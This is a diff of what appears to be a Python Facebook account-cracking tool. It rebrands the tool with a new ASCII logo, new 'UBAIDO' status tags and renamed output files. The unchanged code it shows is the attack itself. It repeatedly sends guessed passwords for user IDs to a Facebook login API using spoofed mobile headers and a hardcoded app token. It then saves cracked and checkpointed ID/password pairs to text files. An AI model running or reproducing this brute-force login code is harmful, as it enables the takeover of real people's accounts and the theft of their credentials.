@@ -17,12 +17,17 @@ bd = random.randint(2e7, 3e7)
 sim = random.randint(2e4, 4e4)
 header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 logo = """
-     \033[1;92m╔═══╗╔╗──╔╗╔═══╗╔═══╗╔════╗╔═══╗╔═══╗╔═══╗
-     \033[1;93m║╔═╗║║╚╗╔╝║║╔══╝╚╗╔╗║╚══╗═║║╔═╗║╚╗╔╗║║╔═╗║
-     \033[1;92m║╚══╗╚╗╚╝╔╝║╚══╗─║║║║──╔╝╔╝║║─║║─║║║║║║─║║
-     \033[1;93m╚══╗║─╚╗╔╝─║╔══╝─║║║║─╔╝╔╝─║╚═╝║─║║║║║╚═╝║
-     \033[1;92m║╚═╝║──║║──║╚══╗╔╝╚╝║╔╝═╚═╗║╔═╗║╔╝╚╝║║╔═╗║
-     \033[1;92m╚═══╝──╚╝──╚═══╝╚═══╝╚════╝╚╝─╚╝╚═══╝╚╝─╚╝
+     \033[1;92m      db    db d8888b.  .d8b.  d888888b d8888b.  .d88b.  
+
+\033[1;93m 88    88 88  `8D d8' `8b   `88'   88  `8D .8P  Y8. 
+
+\033[1;94m 88    88 88oooY' 88ooo88    88    88   88 88    88 
+
+\033[1;92m 88    88 88~~~b. 88~~~88    88    88   88 88    88 
+
+\033[1;93m 88b  d88 88   8D 88   88   .88.   88  .8D `8b  d8' 
+
+\033[1;95m ~Y8888P' Y8888P' YP   YP Y888888P Y8888D'  `Y88P'  
 \033[1;93m-----------------------------------------------------
  \033[1;93m(*)\033[1;92m Developer: Ubaid Ullah
  \033[1;93m(*)\033[1;92m WhatsApp :   +971 50 965 3974
@@ -560,14 +565,14 @@ def choice_select():
 			q = json.loads(data)
 			if "access_token" in q:
 				print(" \033[1;32m [UBAIDO-OK] "+uid+" | "+pass1+"\033[0;97m")
-				ok = open("SYED-ZADAok.txt", "a")
+				ok = open("Uok.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print(" \033[1;33m [SYED-ZADA-CP] "+uid+" | "+pass1+"\033[0;97m")
-					cp = open("SYED-ZADAcp.txt", "a")
+					print(" \033[1;33m [UBAIDO-CP] "+uid+" | "+pass1+"\033[0;97m")
+					cp = open("Ucp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
 					cps.append(uid+pass1)
@@ -575,15 +580,15 @@ def choice_select():
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 					q = json.loads(data)
 					if "access_token" in q:
-						print(" \033[1;32m [SYED-ZADA-OK] "+uid+" | "+pass2+"\033[0;97m")
-						ok = open("SYED-ZADAok.txt", "a")
+						print(" \033[1;32m [UBAIDO-OK] "+uid+" | "+pass2+"\033[0;97m")
+						ok = open("Uok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print(" \033[1;33m [SYED-ZADA-CP] "+uid+" | "+pass2+"\033[0;97m")
-							cp = open("SYED-ZADAcp.txt", "a")
+							print(" \033[1;33m [UBAIDO-CP] "+uid+" | "+pass2+"\033[0;97m")
+							cp = open("Ucp.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
 							cps.append(uid+pass2)
@@ -591,15 +596,15 @@ def choice_select():
 							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 							q = json.loads(data)
 							if "access_token" in q:
-								print(" \033[1;32m [SYED-ZADA-OK] "+uid+" | "+pass3+"\033[0;97m")
-								ok = open("SYED-ZADAok.txt", "a")
+								print(" \033[1;32m [UBAIDO-OK] "+uid+" | "+pass3+"\033[0;97m")
+								ok = open("Uok.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
-									print(" \033[1;33m [SYED-ZADA-CP] "+uid+" | "+pass3+"\033[0;97m")
-									cp = open("SYED-ZADAcp.txt", "a")
+									print(" \033[1;33m [UBAIDO-CP] "+uid+" | "+pass3+"\033[0;97m")
+									cp = open("Ucp.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
 									cps.append(uid+pass3)
@@ -607,15 +612,15 @@ def choice_select():
 									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 									q = json.loads(data)
 									if "access_token" in q:
-										print(" \033[1;32m [SYED-ZADA-OK] "+uid+" | "+pass4+"\033[0;97m")
-										ok = open("SYED-ZADAok.txt", "a")
+										print(" \033[1;32m [UBAIDO-OK] "+uid+" | "+pass4+"\033[0;97m")
+										ok = open("Uok.txt", "a")
 										ok.write(uid+"|"+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error_msg"]:
-											print(" \033[1;33m [SYED-ZADA-CP] "+uid+" | "+pass4+"\033[0;97m")
-											cp = open("SYED-ZADAcp.txt", "a")
+											print(" \033[1;33m [UBAIDO-CP] "+uid+" | "+pass4+"\033[0;97m")
+											cp = open("Ucp.txt", "a")
 											cp.write(uid+"|"+pass4+"\n")
 											cp.close()
 											cps.append(uid+pass4)
@@ -623,15 +628,15 @@ def choice_select():
 											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 											q = json.loads(data)
 											if "access_token" in q:
-												print(" \033[1;32m [SYED-ZADA-OK] "+uid+" | "+pass5+"\033[0;97m")
-												ok = open("SYED-ZADAok.txt", "a")
+												print(" \033[1;32m [UBAIDO-OK] "+uid+" | "+pass5+"\033[0;97m")
+												ok = open("Uok.txt", "a")
 												ok.write(uid+"|"+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error_msg"]:
-													print(" \033[1;33m [SYED-ZADA-CP] "+uid+" | "+pass5+"\033[0;97m")
-													cp = open("SYED-ZADAcp.txt", "a")
+													print(" \033[1;33m [UBAIDO-CP] "+uid+" | "+pass5+"\033[0;97m")
+													cp = open("Ucp.txt", "a")
 													cp.write(uid+"|"+pass5+"\n")
 													cp.close()
 													cps.append(uid+pass5)
@@ -639,15 +644,15 @@ def choice_select():
 													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 													q = json.loads(data)
 													if "access_token" in q:
-														print(" \033[1;32m [SYED-ZADA-OK] "+uid+" | "+pass6+"\033[0;97m")
-														ok = open("SYED-ZADAok.txt", "a")
+														print(" \033[1;32m [UBAIDO-OK] "+uid+" | "+pass6+"\033[0;97m")
+														ok = open("Uok.txt", "a")
 														ok.write(uid+"|"+pass6+"\n")
 														ok.close()
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in q["error_msg"]:
-															print(" \033[1;28m [SYED-ZADA-CP] "+uid+" | "+pass6+"\033[0;97m")
-															cp = open("SYED-ZADAcp.txt", "a")
+															print(" \033[1;28m [UBAIDO-CP] "+uid+" | "+pass6+"\033[0;97m")
+															cp = open("Ucp.txt", "a")
 															cp.write(uid+"|"+pass6+"\n")
 															cp.close()
 															cps.append(uid+pass6)
@@ -655,15 +660,15 @@ def choice_select():
 															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 															q = json.loads(data)
 															if "access_token" in q:
-																print(" \033[1;32m [SYED-ZADA-OK] "+uid+" | "+pass7+"\033[0;97m")
-																ok = open("SYED-ZADAok.txt", "a")
+																print(" \033[1;32m [UBAIDO-OK] "+uid+" | "+pass7+"\033[0;97m")
+																ok = open("Uok.txt", "a")
 																ok.write(uid+"|"+pass7+"\n")
 																ok.close()
 																oks.append(uid+pass7)
 															else:
 																if "www.facebook.com" in q["error_msg"]:
-																	print(" \033[1;33m [SYED-ZADA-CP] "+uid+" | "+pass7+"\033[0;97m")
-																	cp = open("SYED-ZADAcp.txt", "a")
+																	print(" \033[1;33m [UBAIDO-CP] "+uid+" | "+pass7+"\033[0;97m")
+																	cp = open("U-cp.txt", "a")
 																	cp.write(uid+"|"+pass7+"\n")
 																	cp.close()
 																	cps.append(uid+pass7)
